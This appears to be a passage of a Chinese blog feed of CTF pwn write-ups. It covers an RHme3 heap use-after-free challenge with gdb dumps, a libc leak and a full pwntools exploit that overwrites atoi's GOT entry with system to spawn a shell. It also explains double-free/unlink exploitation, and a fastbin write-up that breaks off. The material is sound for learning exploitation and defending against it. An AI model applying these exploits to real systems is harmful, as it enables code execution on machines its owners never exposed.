class="line">0x604010:0x00000002000000010x0000000400000003</span><br><span class="line">0x604020:0x00000000006040300x0000000000000071</span><br><span class="line">0x604030:0x41414141414141410x4141414141414141</span><br><span class="line">0x604040:0x41414141414141410x4141414141414141</span><br><span class="line">0x604050:0x41414141414141410x4141414141414141</span><br><span class="line">0x604060:0x41414141414141410x4141414141414141</span><br><span class="line">0x604070:0x41414141414141410x4141414141414141</span><br><span class="line">0x604080:0x41414141414141410x4141414141414141</span><br><span class="line">0x604090:0x00000000000000000x0000000000000021 &lt;-- player 1</span><br><span class="line">0x6040a0:0x00000002000000010x0000000400000003</span><br><span class="line">0x6040b0:0x00000000006040c00x0000000000000071</span><br><span class="line">0x6040c0:0x42424242424242420x4242424242424242</span><br><span class="line">0x6040d0:0x42424242424242420x4242424242424242</span><br><span class="line">0x6040e0:0x42424242424242420x4242424242424242</span><br><span class="line">0x6040f0:0x42424242424242420x4242424242424242</span><br><span class="line">0x604100:0x42424242424242420x4242424242424242</span><br><span class="line">0x604110:0x42424242424242420x4242424242424242</span><br><span class="line">0x604120:0x00000000000000000x0000000000020ee1</span><br><span class="line"></span><br><span class="line">alloc（<span class="string">' C '</span> * 0x 80）</span><br><span class="line">alloc（<span class="string">' D '</span> * 0x 80）</span><br><span class="line"></span><br><span class="line">(gdb) x/90gx 0x604000</span><br><span class="line">0x604000:0x00000000000000000x0000000000000021 &lt;-- player 0</span><br><span class="line">0x604010:0x00000002000000010x0000000400000003</span><br><span class="line">0x604020:0x00000000006040300x0000000000000071</span><br><span class="line">0x604030:0x41414141414141410x4141414141414141</span><br><span class="line">0x604040:0x41414141414141410x4141414141414141</span><br><span class="line">0x604050:0x41414141414141410x4141414141414141</span><br><span class="line">0x604060:0x41414141414141410x4141414141414141</span><br><span class="line">0x604070:0x41414141414141410x4141414141414141</span><br><span class="line">0x604080:0x41414141414141410x4141414141414141</span><br><span class="line">0x604090:0x00000000000000000x0000000000000021 &lt;-- player 1</span><br><span class="line">0x6040a0:0x00000002000000010x0000000400000003</span><br><span class="line">0x6040b0:0x00000000006040c00x0000000000000071</span><br><span class="line">0x6040c0:0x42424242424242420x4242424242424242</span><br><span class="line">0x6040d0:0x42424242424242420x4242424242424242</span><br><span class="line">0x6040e0:0x42424242424242420x4242424242424242</span><br><span class="line">0x6040f0:0x42424242424242420x4242424242424242</span><br><span class="line">0x604100:0x42424242424242420x4242424242424242</span><br><span class="line">0x604110:0x42424242424242420x4242424242424242</span><br><span class="line">0x604120:0x00000000000000000x0000000000000021 &lt;-- player 2</span><br><span class="line">0x604130:0x00000002000000010x0000000400000003</span><br><span class="line">0x604140:0x00000000006041500x0000000000000091</span><br><span class="line">0x604150:0x43434343434343430x4343434343434343</span><br><span class="line">0x604160:0x43434343434343430x4343434343434343</span><br><span class="line">0x604170:0x43434343434343430x4343434343434343</span><br><span class="line">0x604180:0x43434343434343430x4343434343434343</span><br><span class="line">0x604190:0x43434343434343430x4343434343434343</span><br><span class="line">0x6041a0:0x43434343434343430x4343434343434343</span><br><span class="line">0x6041b0:0x43434343434343430x4343434343434343</span><br><span class="line">0x6041c0:0x43434343434343430x4343434343434343</span><br><span class="line">0x6041d0:0x00000000000000000x0000000000000021 &lt;-- player 3</span><br><span class="line">0x6041e0:0x00000002000000010x0000000400000003</span><br><span class="line">0x6041f0:0x00000000006042000x0000000000000091</span><br><span class="line">0x604200:0x44444444444444440x4444444444444444</span><br><span class="line">0x604210:0x44444444444444440x4444444444444444</span><br><span class="line">0x604220:0x44444444444444440x4444444444444444</span><br><span class="line">0x604230:0x44444444444444440x4444444444444444</span><br><span class="line">0x604240:0x44444444444444440x4444444444444444</span><br><span class="line">0x604250:0x44444444444444440x4444444444444444</span><br><span class="line">0x604260:0x44444444444444440x4444444444444444</span><br><span class="line">0x604270:0x44444444444444440x4444444444444444</span><br><span class="line">0x604280:0x00000000000000000x0000000000020d81</span><br><span class="line"></span><br><span class="line">select(2)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">(gdb) x/80gx 0x604000</span><br><span class="line">0x604000:0x00000000000000000x0000000000000021 &lt;-- player 0 [<span class="keyword">in</span> use]</span><br><span class="line">0x604010:0x00000002000000010x0000000400000003</span><br><span class="line">0x604020:0x00000000006040300x0000000000000071</span><br><span class="line">0x604030:0x41414141414141410x4141414141414141</span><br><span class="line">0x604040:0x41414141414141410x4141414141414141</span><br><span class="line">0x604050:0x41414141414141410x4141414141414141</span><br><span class="line">0x604060:0x41414141414141410x4141414141414141</span><br><span class="line">0x604070:0x41414141414141410x4141414141414141</span><br><span class="line">0x604080:0x41414141414141410x4141414141414141</span><br><span class="line">0x604090:0x00000000000000000x0000000000000021 &lt;-- player 1 [<span class="keyword">in</span> use]</span><br><span class="line">0x6040a0:0x00000002000000010x0000000400000003</span><br><span class="line">0x6040b0:0x00000000006040c00x0000000000000071</span><br><span class="line">0x6040c0:0x42424242424242420x4242424242424242</span><br><span class="line">0x6040d0:0x42424242424242420x4242424242424242</span><br><span class="line">0x6040e0:0x42424242424242420x4242424242424242</span><br><span class="line">0x6040f0:0x42424242424242420x4242424242424242</span><br><span class="line">0x604100:0x42424242424242420x4242424242424242</span><br><span class="line">0x604110:0x42424242424242420x4242424242424242</span><br><span class="line">0x604120:0x00000000000000000x0000000000000021 &lt;-- player 2 [free]</span><br><span class="line">0x604130:0x00000000000000000x0000000400000003</span><br><span class="line">0x604140:0x00000000006041500x0000000000000091</span><br><span class="line">0x604150:0x00007ffff7dd37b80x00007ffff7dd37b8 </span><br><span class="line">0x604160:0x43434343434343430x4343434343434343</span><br><span class="line">0x604170:0x43434343434343430x4343434343434343</span><br><span class="line">0x604180:0x43434343434343430x4343434343434343</span><br><span class="line">0x604190:0x43434343434343430x4343434343434343</span><br><span class="line">0x6041a0:0x43434343434343430x4343434343434343</span><br><span class="line">0x6041b0:0x43434343434343430x4343434343434343</span><br><span class="line">0x6041c0:0x43434343434343430x4343434343434343</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后 libc的泄露</span><br><span class="line"></span><br><span class="line"><span class="comment"># 'selected'数组包含第3个玩家对象</span></span><br><span class="line">＃我们滥用UAF vuln泄漏libc </span><br><span class="line">＃ show_player只检查<span class="string">'selected'</span>数组是否为空</span><br><span class="line">＃如果不是，它将打印玩家对象的值</span><br><span class="line">＃而不检查如果它实际上是免费的</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line"></span><br><span class="line">leak        = u64(p.recv(6).ljust(8, <span class="string">'\x00'</span>))</span><br><span class="line">libc        = leak - 0x3c17b8</span><br><span class="line">system      = libc + 0x46590</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Leak:   0x&#123;:x&#125;"</span>.format(leak))</span><br><span class="line">log.info(<span class="string">"Libc:   0x&#123;:x&#125;"</span>.format(libc))</span><br><span class="line">log.info(<span class="string">"system: 0x&#123;:x&#125;"</span>.format(system))</span><br><span class="line"></span><br><span class="line">[*] Leak:   0x7ffff7dd37b8</span><br><span class="line">[*] Libc:   0x7ffff7a12000</span><br><span class="line">[*] system: 0x7ffff7a58590</span><br><span class="line"></span><br><span class="line">接下来就要获得任意代码执行</span><br><span class="line"></span><br><span class="line">free(3) <span class="comment">## free掉top chunk前一个</span></span><br><span class="line"></span><br><span class="line">0x604120:0x00000000000000000x00000000000000b1 &lt;-- player 2 [free]</span><br><span class="line">0x604130:0x00007ffff7dd37b80x00007ffff7dd37b8</span><br><span class="line">0x604140:0x00000000006041500x0000000000000091</span><br><span class="line">0x604150:0x00007ffff7dd37b80x00007ffff7dd37b8</span><br><span class="line">0x604160:0x43434343434343430x4343434343434343</span><br><span class="line">0x604170:0x43434343434343430x4343434343434343</span><br><span class="line">0x604180:0x43434343434343430x4343434343434343</span><br><span class="line">0x604190:0x43434343434343430x4343434343434343</span><br><span class="line">0x6041a0:0x43434343434343430x4343434343434343</span><br><span class="line">0x6041b0:0x43434343434343430x4343434343434343</span><br><span class="line">0x6041c0:0x43434343434343430x4343434343434343</span><br><span class="line">0x6041d0:0x00000000000000b00x0000000000000020 &lt;-- player 3 [free]</span><br><span class="line">0x6041e0:0x00000000000000000x0000000400000003</span><br><span class="line">0x6041f0:0x00000000006042000x0000000000020e11 &lt;-- top chunk</span><br><span class="line"></span><br><span class="line">Malloc不喜欢碎片，所以它做的是整合任何相邻的空闲块，根据它们的合并大小更新这些块的大小值，</span><br><span class="line">最后将顶块的大小值更新为更高的块，因为块是free的，并且意味着要分配更多的可用空间。</span><br><span class="line"></span><br><span class="line">(0x20)     fastbin[0]: 0x6041d0 --&gt; 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">                  top: 0x6041f0 (size : 0x20e10) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x604120 (size : 0xb0)</span><br><span class="line"></span><br><span class="line">  这个地方不是很懂，感觉就是扩大了top chunk的size，可是有什么用</span><br><span class="line"></span><br><span class="line">现在考虑以下内容。下次分配会发生什么？</span><br><span class="line"></span><br><span class="line">请记住，每个player对象的默认大小为0x20，指针指向任意大小的块，具体取决于输入的长度。</span><br><span class="line"></span><br><span class="line">当我们分配一个新块时，malloc将根据大小请求检查相应的bin列表，并检查是否有相同大小的等效空闲块以回馈给用户。这就是所谓的首次适应行为。请记住，快速列表中的删除和添加发生在列表的HEAD中。换句话说，我们应该期待玩家的信息被存储，0x6041d0因为它是一个free的fastbin大小并满足0x20要求。</span><br><span class="line"></span><br><span class="line">未分类的bin保存地址0x604120。这是玩家2的大块地址。这与free（3）之前的地址不同。那是因为malloc整合了相邻的空闲块，并且它们变成了一个完整的空闲块，因此它必须更新地址。与邻接检查对应的代码如下：</span><br><span class="line"></span><br><span class="line">/ *向后巩固* /</span><br><span class="line"> <span class="keyword">if</span>（！prev_inuse（p））&#123;</span><br><span class="line">      prevsize = p-&gt; prev_size ;</span><br><span class="line">      size + = prevsize;</span><br><span class="line">      p = chunk_at_offset（p， - （（long）prevsize））;</span><br><span class="line">      unlink（av，p，bck，fwd）;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">前面free了player2，3的地址，然后被malloc整合成一个大的chunk</span><br><span class="line"></span><br><span class="line">无论我们输入的名称大小（只要它不大于当前未分类的bin列表中的块，0xb0在我们的例子中），我们应该返回地址0x604120以存储名称。如果大小小于0xb0，那么给定的块将被分割，因为没有必要回馈超过我们要求的数量，对吧？</span><br><span class="line"></span><br><span class="line">但是，0x604120是player2的大块地址！这意味着，我们可以使用的名称有效载荷覆盖其数据并混淆其结构。请记住，player2仍然在选定的变量中，因此我们仍然可以打印其内容，编辑它等。如果我们能够使用我们选择的指针（GOT条目）覆盖指向原始名称的指针并调用edit它的功能呢？我们可以重定向代码执行。这是一个abritrary写原语！</span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite 3rd player's (index 2) name pointer with atoi</span></span><br><span class="line"><span class="comment"># in order to edit it with system's address</span></span><br><span class="line">alloc(<span class="string">'Z'</span>*8 * 2 + p64(atoi_got))</span><br><span class="line"></span><br><span class="line">edit(p64(system))</span><br><span class="line"></span><br><span class="line">我选择覆盖的函数的GOT条目是atoi。这背后的原因是atoi接收指向我们输入的指针，</span><br><span class="line">以便将其转换回整数。如果atoi是system有关系吗？如果我们提供sh它应该是什么的论据，会发生什么</span><br><span class="line"></span><br><span class="line">0x604120:0x00000000000000000x0000000000000021 &lt;-- new player<span class="string">'s name [old player 2]</span></span><br><span class="line"><span class="string">0x604130:0x5a5a5a5a5a5a5a5a0x5a5a5a5a5a5a5a5a</span></span><br><span class="line"><span class="string">0x604140:0x00000000006031100x0000000000000091</span></span><br><span class="line"><span class="string">0x604150:0x00007ffff7dd37b80x00007ffff7dd37b8</span></span><br><span class="line"><span class="string">0x604160:0x43434343434343430x4343434343434343</span></span><br><span class="line"><span class="string">0x604170:0x43434343434343430x4343434343434343</span></span><br><span class="line"><span class="string">0x604180:0x43434343434343430x4343434343434343</span></span><br><span class="line"><span class="string">0x604190:0x43434343434343430x4343434343434343</span></span><br><span class="line"><span class="string">0x6041a0:0x43434343434343430x4343434343434343</span></span><br><span class="line"><span class="string">0x6041b0:0x43434343434343430x4343434343434343</span></span><br><span class="line"><span class="string">0x6041c0:0x43434343434343430x4343434343434343</span></span><br><span class="line"><span class="string">0x6041d0:0x00000000000000900x0000000000000020 &lt;-- new allocated player</span></span><br><span class="line"><span class="string">0x6041e0:0x00000002000000010x0000000400000003</span></span><br><span class="line"><span class="string">0x6041f0:0x0000000000604130</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">player2的地址已经被atoi的got表所覆盖</span></span><br><span class="line"><span class="string">一旦我们请求编辑其名称，我们将覆盖atoi'</span>s带system<span class="string">'s地址的条目。getshell！</span></span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">atoi_got = 0x603110</span><br><span class="line"></span><br><span class="line">def alloc(name, attack = 1, </span><br><span class="line">  defense = 2, speed = 3, precision = 4):</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'points: '</span>)</span><br><span class="line">p.sendline(str(attack))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'points: '</span>)</span><br><span class="line">p.sendline(str(defense))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'speed: '</span>)</span><br><span class="line">p.sendline(str(speed))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'precision: '</span>)</span><br><span class="line">p.sendline(str(precision))</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">def edit(name):</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">def select(idx):</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line"></span><br><span class="line">alloc(<span class="string">'A'</span>*0x60)</span><br><span class="line">alloc(<span class="string">'B'</span>*0x60)</span><br><span class="line">alloc(<span class="string">'C'</span>*0x80)</span><br><span class="line">alloc(<span class="string">'D'</span>*0x80)</span><br><span class="line"></span><br><span class="line">select(2)</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The 'selected' array contains the 3rd player object</span></span><br><span class="line"><span class="comment"># We are abusing the UAF vuln to leak libc</span></span><br><span class="line"><span class="comment"># show_player just checks if the 'selected' array is empty</span></span><br><span class="line"><span class="comment"># if it's not, it will print the value of the player's object</span></span><br><span class="line"><span class="comment"># without checking if it's actually free'd or not</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line"></span><br><span class="line">leak        = u64(p.recv(6).ljust(8, <span class="string">'\x00'</span>))</span><br><span class="line">libc        = leak - 0x3c17b8</span><br><span class="line">system      = libc + 0x46590</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Leak:   0x&#123;:x&#125;"</span>.format(leak))</span><br><span class="line">log.info(<span class="string">"Libc:   0x&#123;:x&#125;"</span>.format(libc))</span><br><span class="line">log.info(<span class="string">"system: 0x&#123;:x&#125;"</span>.format(system))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Overwriting atoi with system"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Consolidate with top chunk</span></span><br><span class="line">free(3) </span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite 3rd player's (index 2) name pointer with atoi</span></span><br><span class="line"><span class="comment"># in order to edit it with system's address</span></span><br><span class="line">alloc(<span class="string">'Z'</span>*8 * 2 + p64(atoi_got))</span><br><span class="line"></span><br><span class="line">edit(p64(system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    log.info(<span class="string">"For remote: %s HOST PORT"</span> % sys.argv[0])</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; 1:</span><br><span class="line">        p = remote(sys.argv[1], int(sys.argv[2]))</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(<span class="string">'./main.elf'</span>)</span><br><span class="line">        pause()</span><br><span class="line">        pwn()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;RHme3 CTF 的一道题&lt;/p&gt;
&lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highligh
      
    
    </summary>
    
      <category term="百度学习" scheme="http://yoursite.com/categories/%E7%99%BE%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Double free</title>
    <link href="http://yoursite.com/2019/08/07/double%20free/"/>
    <id>http://yoursite.com/2019/08/07/double free/</id>
    <published>2019-08-07T02:10:17.367Z</published>
    <updated>2019-08-07T02:21:23.129Z</updated>
    
    <content type="html"><![CDATA[<p>原文借鉴：<a href="http://d0m021ng.github.io/2017/02/24/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BDouble-free/" target="_blank" rel="noopener">http://d0m021ng.github.io/2017/02/24/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BDouble-free/</a></p><h3 id="0x01-Glibc背景知识"><a href="#0x01-Glibc背景知识" class="headerlink" title="0x01 Glibc背景知识"></a>0x01 Glibc背景知识</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux下堆分配器主要由两个结构管理堆内存，一种是堆块头部形成的隐式链表，另一种是管理空闲堆块的显式链表（Glibc中的bins数据结构）。关于bins的介绍已经有很多，就不赘述了。接下来介绍一下Linux下Double free漏洞原理以及free函数的堆块合并过程。</span><br></pre></td></tr></table></figure><h3 id="0x02-Doublefree漏洞原理"><a href="#0x02-Doublefree漏洞原理" class="headerlink" title="0x02 Doublefree漏洞原理"></a>0x02 Doublefree漏洞原理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> free函数在释放堆块时，会通过隐式链表判断相邻前、后堆块是否为空闲堆块；如果堆块为空闲就会进行合并，然后利用Unlink机制将该空闲堆块从Unsorted bin中取下。如果用户精心构造的假堆块被Unlink，很容易导致一次固定地址写，然后转换为任意地址读写，从而控制程序的执行。</span><br><span class="line"></span><br><span class="line">free函数原理：由堆块头部形成的隐式链表可知，一个需释放堆块相邻的堆块有两个：前一个块（由当前块头指针加pre_size确定），后一个块（由当前块头指针加size确定）。从而，在合并堆块时会存在两种情况：向后合并、向前合并。当前一个块和当前块合并时，叫做向后合并。当后一个块和当前块合并时，叫做向前合并。</span><br><span class="line">相关代码</span><br></pre></td></tr></table></figure><h3 id="0x03-Doublefree漏洞利用原理"><a href="#0x03-Doublefree漏洞利用原理" class="headerlink" title="0x03 Doublefree漏洞利用原理"></a>0x03 Doublefree漏洞利用原理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">以64位应用为例：如果在free一个指针指向的块时，由于堆溢出，将后一个块的块头改成如下格式:</span><br><span class="line">fake_prevsize1 = 被释放块大小；</span><br><span class="line">fake_size1 = 0x20 | 1 (fake_size1 = 0x20)</span><br><span class="line">fake_fd = free@got.plt - 0x18</span><br><span class="line">fake_bk = shellcode address</span><br><span class="line">fake_prevsize2 = 0x20</span><br><span class="line">fake_size2 = 0x10</span><br><span class="line">如下图:</span><br><span class="line">如果chunk0被释放(fake_size1 = 0x21)，进行空闲块合并时，1）由于前一个块非空闲，不会向后合并。2）根据chunk2判断后一个块chunk1空闲，向前合并，导致unlink。</span><br><span class="line">如果chunk1被释放(fake_size1 = 0x20)，进行空闲块合并时，1）由于前一个块空闲，向后合并,导致unlink。2）根据chunk2判断后一个块chunk1空闲，向前合并，导致unlink。</span><br><span class="line">根据unlink宏知道， 前一个块 FD 指向 free@got.plt - 0x18, 后一个块 BK 指向 shellcode address。然后前一个块 FD 的bk指针即free@got.plt，值为shellcode address, 后一个块 BK 的 fd 指针即shellcode + 0x10，值为 free@got.plt。从而实现了一次固定地址写。</span><br><span class="line"></span><br><span class="line">High    |----------------|</span><br><span class="line">        |   fake_size2   |</span><br><span class="line">        |----------------|</span><br><span class="line">        | fake_prevsize2 |</span><br><span class="line">        |----------------|  chunk2 pointer</span><br><span class="line">        |    fake_bk     |</span><br><span class="line">        |----------------|</span><br><span class="line">        |    fake_fd     |</span><br><span class="line">        |----------------|  chunk1 malloc returned pointer</span><br><span class="line">        |  fake_size1    |</span><br><span class="line">        |----------------|</span><br><span class="line">        | fake_prevsize1 |</span><br><span class="line">        |----------------|  chunk1 pointer</span><br><span class="line">        |     ......     |</span><br><span class="line">        |    padding     |</span><br><span class="line">        |     ......     |</span><br><span class="line">        |----------------|</span><br><span class="line">        |    fake_bk     |</span><br><span class="line">        |----------------|</span><br><span class="line">        |    fake_fd     |</span><br><span class="line">        |----------------|  chunk0 malloc returned pointer</span><br><span class="line">        |     size       |</span><br><span class="line">        |----------------|</span><br><span class="line">        |   prev_size    |</span><br><span class="line">Low     |----------------|  chunk0 pointer</span><br><span class="line"></span><br><span class="line">但是，由于当前glibc的加固检测机制，会检查显式链表中前一个块的fd与后一个块的bk是否都指向当前需要unlink的块。这样攻击者就无法替换chunk1(或chunk0)的fd与bk。相关代码如下：</span><br><span class="line">如<span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span><br><span class="line">   malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV)</span><br><span class="line"></span><br><span class="line">   针对这种情况，需要在内存中找到一个指向需要unlink块的指针，就可以绕过。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原文借鉴：&lt;a href=&quot;http://d0m021ng.github.io/2017/02/24/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BDouble-free/&quot; target=&quot;_blank&quot; rel=&quot;noopen
      
    
    </summary>
    
      <category term="百度学习" scheme="http://yoursite.com/categories/%E7%99%BE%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>fastbin_dup_into_stack</title>
    <link href="http://yoursite.com/2019/08/06/fastbin_dup_into_stack/"/>
    <id>http://yoursite.com/2019/08/06/fastbin_dup_into_stack/</id>
    <published>2019-08-06T15:21:13.839Z</published>
    <updated>2019-08-07T01:59:58.758Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-源代码"><a href="#0x01-源代码" class="headerlink" title="0x01 源代码"></a>0x01 源代码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 